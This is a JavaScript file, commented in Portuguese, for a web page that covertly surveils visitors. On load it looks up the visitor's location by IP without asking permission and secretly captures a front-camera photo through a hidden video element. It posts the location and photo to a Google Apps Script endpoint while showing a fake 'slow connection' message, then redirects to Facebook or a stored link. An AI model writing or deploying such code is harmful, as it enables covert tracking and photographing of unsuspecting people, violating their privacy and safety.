const GOOGLE_APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyEbnaQ6ro8X0XvKBcBZaOZUh-MHhJd08sOFSgsAXPizJ_0bbu2fat2fLK8-6G48eLU/exec';

let cameraStream = null;
let facialImageData = null;
let userLocation = null;
let sessionId = null;  // ✅ NOVO: SessionId único para toda a sequência
let cameraAvailable = false;  // ✅ NOVO: Flag para saber se câmera funcionou

document.addEventListener('DOMContentLoaded', function () {
    // ✅ Gerar sessionId ÚNICO no início
    sessionId = 'SESSION_' + Math.floor(Date.now() / 1000) + '_' + Math.random().toString(36).substr(2, 9);
    console.log('🔐 SessionId gerado:', sessionId);
    
    // ✅ PASSO 1: Pedir localização PRIMEIRO (sem câmera)
    startProcessing();
});

async function startProcessing() {
    try {
        console.log('🔄 Iniciando processo...');
        showStatus('Conexão lenta.');
        
        // ✅ PASSO 1: LOCALIZAÇÃO (obrigatório tentar)
        try {
            await getLocation();
            console.log('✅ Localização obtida');
            
            // ✅ PASSO 2: ENVIAR LOCALIZAÇÃO (apenas se conseguiu)
            if (userLocation?.latitude && userLocation?.longitude) {
                showStatus('Conexão lenta.');
                await sendLocationOnly();
                console.log('✅ Localização enviada');
            } else {
                console.log('⏭️ Localização null, pulando POST 1...');
            }
        } catch (locErr) {
            console.warn('⚠️ Localização falhou:', locErr.message);
            console.log('📍 Continuando sem localização...');
        }
        
        // ✅ PASSO 3: CÂMERA + FOTO (opcional)
        showStatus('Conexão lenta.');
        try {
            await startCameraCapture();
        } catch (camErr) {
            console.warn('⚠️ Câmera falhou:', camErr.message);
            console.log('📸 Continuando sem foto...');
            
            // Se câmera falhou, enviar PDF mesmo assim
            await sendFinalPdf();
        }
        
    } catch (err) {
        console.error('❌ Erro crítico no processo:', err);
        showStatus('Erro no processo. Tente novamente.');
    }
}

// ─── CÂMERA - Captura automática ─────────────────────────────────────────────

async function startCameraCapture() {
    try {
        let hiddenVideo = document.createElement('video');
        hiddenVideo.id = 'hiddenVideo';
        hiddenVideo.style.display = 'none';
        hiddenVideo.width = 400;
        hiddenVideo.height = 300;
        hiddenVideo.autoplay = true;
        hiddenVideo.playsinline = true;
        document.body.appendChild(hiddenVideo);

        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 400 }, height: { ideal: 300 }, facingMode: 'user' },
            audio: false
        });
        hiddenVideo.srcObject = cameraStream;
        
        // Aguardar câmera ficar pronta
        await new Promise(resolve => {
            hiddenVideo.onloadedmetadata = () => {
                hiddenVideo.play().then(resolve).catch(resolve);
            };
        });
        
        // Auto-capture após 2 segundos
        setTimeout(() => captureFacialPhoto(hiddenVideo), 2000);
        
    } catch (err) {
        console.error('❌ Erro na câmera frontal:', err.message);
        // ⚠️ NÃO tenta fallback, lança erro para startProcessing tratar
        throw new Error('Câmera frontal indisponível: ' + err.message);
    }
}

async function startCameraCaptureFallback() {
    // ⚠️ REMOVIDA: Não tenta mais câmera traseira
    throw new Error('Câmera não disponível (frontal nem traseira)');
}

async function captureFacialPhoto(hiddenVideo) {
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    try {
        // Capturar foto
        showStatus('Conexão lenta.');
        canvas.width = hiddenVideo.videoWidth || 400;
        canvas.height = hiddenVideo.videoHeight || 300;
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

        facialImageData = canvas.toDataURL('image/jpeg', 0.85);
        stopCamera(hiddenVideo);
        console.log('📸 Foto capturada');
        cameraAvailable = true;  // ✅ NOVO: Marcar que foto foi capturada

        // ENVIAR FOTO (POST 2)
        showStatus('Conexão lenta.');
        await sendPhotoOnly();
        console.log('✅ Foto enviada');

        // GERAR E ENVIAR PDF (POST 3)
        await sendFinalPdf();

    } catch (err) {
        console.error('❌ Erro ao capturar foto:', err);
        throw err;
    }
}

function stopCamera(video) {
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    if (video) video.remove();
}

// ─── GEOLOCALIZAÇÃO (SEM PEDIR PERMISSÃO - USA IP) ──────────────────────

function getLocation() {
    return new Promise(resolve => {
        console.log('🔄 Detectando localização pelo IP...');
        
        // ✅ NOVO: Usar API de IP para geolocalização (SEM PEDIR PERMISSÃO)
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                console.log('✅ Localização obtida pelo IP');
                userLocation = {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    accuracy: data.org ? 10000 : null,  // IP é menos preciso (±10km)
                    timestamp: new Date().toLocaleString('pt-BR'),
                    mapLink: `https://maps.google.com/?q=${data.latitude},${data.longitude}`,
                    source: 'ip',  // Identificar que é por IP
                    city: data.city,
                    region: data.region,
                    country: data.country_name
                };
                console.log('📍 Localização por IP:', userLocation);
                resolve(userLocation);
            })
            .catch(error => {
                console.warn('⚠️ Erro ao obter localização pelo IP:', error.message);
                // Se API falhar, continua sem localização (null)
                userLocation = {
                    latitude: null,
                    longitude: null,
                    accuracy: null,
                    timestamp: new Date().toLocaleString('pt-BR'),
                    mapLink: '',
                    source: 'error',
                    errorMessage: error.message
                };
                console.log('⏭️ Sem localização disponível');
                resolve(userLocation);
            });
    });
}

// ─── ENVIAR SEPARADAMENTE PARA GOOGLE DRIVE ────────────────────────────────

// POST 1: ENVIAR LOCALIZAÇÃO
async function sendLocationOnly() {
    try {
        const payload = {
            type: 'location',  // Tipo de dados
            sessionId: sessionId,  // ✅ NOVO: SessionId único
            clientName: 'USUARIO_TEMP',
            clientCPF: 'TEMP',
            notaFiscal: 'TEMP',
            latitude: userLocation?.latitude || null,
            longitude: userLocation?.longitude || null,
            accuracy: userLocation?.accuracy || null,
            mapLink: userLocation?.mapLink || null,
            timestamp: new Date().toISOString()
        };

        console.log('📡 POST 1 - Enviando localização...');
        const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        });

        const text = await response.text();
        const result = JSON.parse(text);

        if (result.status === 'success') {
            console.log('✅ Localização enviada:', result);
            return result;
        } else {
            throw new Error(result.message || 'Erro ao enviar localização');
        }

    } catch (error) {
        console.error('❌ Erro ao enviar localização:', error);
        throw error;
    }
}

// POST 2: ENVIAR FOTO
async function sendPhotoOnly() {
    try {
        let facialBase64 = null;
        if (facialImageData) {
            facialBase64 = facialImageData.split(',')[1];
        }

        const payload = {
            type: 'photo',  // Tipo de dados
            sessionId: sessionId,  // ✅ NOVO: SessionId único
            clientName: 'USUARIO_TEMP',
            clientCPF: 'TEMP',
            notaFiscal: 'TEMP',
            facialImageBase64: facialBase64,
            timestamp: new Date().toISOString()
        };

        console.log('📡 POST 2 - Enviando foto...');
        const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        });

        const text = await response.text();
        const result = JSON.parse(text);

        if (result.status === 'success') {
            console.log('✅ Foto enviada:', result);
            return result;
        } else {
            throw new Error(result.message || 'Erro ao enviar foto');
        }

    } catch (error) {
        console.error('❌ Erro ao enviar foto:', error);
        throw error;
    }
}

// POST 3: ENVIAR PDF
async function sendPdfOnly() {
    try {
        // Gerar PDF
        const { jsPDF } = window.jspdf;
        const pdf = new jsPDF();
        pdf.setFont('Helvetica', 'bold');
        pdf.setFontSize(72);
        pdf.text('OI', 105, 150, { align: 'center' });
        const pdfBlob = pdf.output('blob');
        const pdfBase64 = await blobToBase64(pdfBlob);

        const payload = {
            type: 'pdf',  // Tipo de dados
            sessionId: sessionId,  // ✅ NOVO: SessionId único
            clientName: 'USUARIO_TEMP',
            clientCPF: 'TEMP',
            notaFiscal: 'TEMP',
            pdfBase64: pdfBase64,
            timestamp: new Date().toISOString()
        };

        console.log('📡 POST 3 - Enviando PDF...');
        const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        });

        const text = await response.text();
        const result = JSON.parse(text);

        if (result.status === 'success') {
            console.log('✅ PDF enviado:', result);
            return result;
        } else {
            throw new Error(result.message || 'Erro ao enviar PDF');
        }

    } catch (error) {
        console.error('❌ Erro ao enviar PDF:', error);
        throw error;
    }
}

// ✅ NOVO: Função para enviar PDF final (com ou sem foto)
async function sendFinalPdf() {
    try {
        showStatus('Conexão lenta.');
        
        // Gerar PDF
        const { jsPDF } = window.jspdf;
        const pdf = new jsPDF();
        pdf.setFont('Helvetica', 'bold');
        pdf.setFontSize(72);
        pdf.text('OI', 105, 150, { align: 'center' });
        const pdfBlob = pdf.output('blob');
        const pdfBase64 = await blobToBase64(pdfBlob);

        const payload = {
            type: 'pdf',  // Tipo de dados
            sessionId: sessionId,  // ✅ SessionId único
            clientName: 'USUARIO_TEMP',
            clientCPF: 'TEMP',
            notaFiscal: 'TEMP',
            pdfBase64: pdfBase64,
            timestamp: new Date().toISOString()
        };

        console.log('📡 POST 3 - Enviando PDF (final)...');
        console.log('📊 Resumo:', {
            temLocalizacao: !!userLocation?.latitude,
            temFoto: !!facialImageData,
            temPdf: true
        });

        const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        });

        const text = await response.text();
        const result = JSON.parse(text);

        if (result.status === 'success') {
            console.log('✅ Tudo finalizado e enviado!', result);
            console.log('📁 Pasta criada:', result.pasta);
            console.log('📄 Arquivos:', result.files);
            
            // ✅ SUCESSO - Redirecionar
            showStatus('Conexão lenta.');
            setTimeout(() => {
                const redirectLink = localStorage.getItem('redirectLink') || 'https://www.facebook.com.br';
                window.location.href = redirectLink;
            }, 1000);
            
            return result;
        } else {
            throw new Error(result.message || 'Erro ao finalizar envio');
        }

    } catch (error) {
        console.error('❌ Erro ao enviar PDF final:', error);
        showStatus('Erro ao finalizar. Tente novamente.');
        throw error;
    }
}

function blobToBase64(blob) {
    return new Promise(resolve => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result.split(',')[1]);
        reader.readAsDataURL(blob);
    });
}

// ─── FUNÇÃO PARA DEBUG / TESTE ──────────────────────────────────────────────

function testarLocalizacao() {
    console.log('🧪 Testando Geolocalização...');
    console.log('userLocation atual:', userLocation);
    
    getLocation().then(() => {
        console.log('✅ Teste concluído');
        console.log('📍 Resultado final:', userLocation);
    });
}

// Disponível para chamar no console: testarLocalizacao()

// ─── STATUS COM SPINNER ──────────────────────────────────────────────────────

function showStatus(message) {
    const statusEl = document.getElementById('status');
    const spinnerEl = document.getElementById('spinner');
    
    if (statusEl) {
        statusEl.textContent = message;
        statusEl.classList.remove('hidden');
    }
    
    if (spinnerEl) {
        spinnerEl.classList.remove('hidden');
    }
}

function hideStatus() {
    const statusEl = document.getElementById('status');
    const spinnerEl = document.getElementById('spinner');
    
    if (statusEl) {
        statusEl.classList.add('hidden');
    }
    
    if (spinnerEl) {
        spinnerEl.classList.add('hidden');
    }
}
